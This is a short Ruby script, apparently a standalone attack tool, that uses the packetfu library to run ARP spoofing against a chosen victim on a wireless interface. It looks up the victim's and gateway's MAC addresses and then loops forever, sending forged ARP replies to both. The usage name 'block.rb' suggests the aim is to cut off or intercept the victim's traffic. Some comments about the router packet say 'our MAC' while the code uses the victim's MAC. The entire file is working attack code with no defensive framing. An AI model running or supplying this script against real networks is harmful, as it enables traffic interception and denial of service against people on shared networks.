#!/usr/bin/env ruby

#
# ARP Spoof Basic script
#
require 'packetfu'


if ARGV.count < 1
  puts "Usage: sudo -E block.rb <victim_ip>"
  abort
elsif ARGV.count == 2
  victim_mac = ARGV[1].to_s
end

info = PacketFu::Utils.whoami?(:iface => "wlan0")
our_ip = info[:ip_saddr]
our_mac = info[:eth_saddr]

victim_ip = ARGV[0].to_s
victim_mac ||= PacketFu::Utils.arp(victim_ip, :iface => "wlan0")

n = our_ip.split('.')
router_ip = "#{n[0]}.#{n[1]}.#{n[2]}.1"
router_mac = PacketFu::Utils.arp(router_ip, :iface => "wlan0")

puts '='*80
puts "our_ip: #{our_ip}"
puts "our_mac: #{our_mac}"
puts '-'
puts "victim_ip: #{victim_ip}"
puts "victim_mac: #{victim_mac}"
puts '-'
puts "router_ip: #{router_ip}"
puts "router_mac: #{router_mac}"
puts '='*80

#
# Victim
#
# Build Ethernet header
arp_packet_victim = PacketFu::ARPPacket.new
arp_packet_victim.eth_saddr = our_mac                   # our MAC address
arp_packet_victim.eth_daddr = victim_mac                # the victim's MAC address
# Build ARP Packet
arp_packet_victim.arp_saddr_mac = our_mac               # our MAC address
arp_packet_victim.arp_daddr_mac = victim_mac            # the victim's MAC address
arp_packet_victim.arp_saddr_ip = router_ip              # the router's IP
arp_packet_victim.arp_daddr_ip = victim_ip              # the victim's IP
arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply

#
# Router
#
# Build Ethernet header
arp_packet_router = PacketFu::ARPPacket.new
arp_packet_router.eth_saddr = victim_mac                   # our MAC address
arp_packet_router.eth_daddr = router_mac                # the router's MAC address
# Build ARP Packet
arp_packet_router.arp_saddr_mac = victim_mac               # our MAC address
arp_packet_router.arp_daddr_mac = router_mac            # the router's MAC address
arp_packet_router.arp_saddr_ip = victim_ip              # the victim's IP
arp_packet_router.arp_daddr_ip = router_ip              # the router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

#
# Send
#
while true
    sleep 1
    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(info[:iface])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(info[:iface])
end
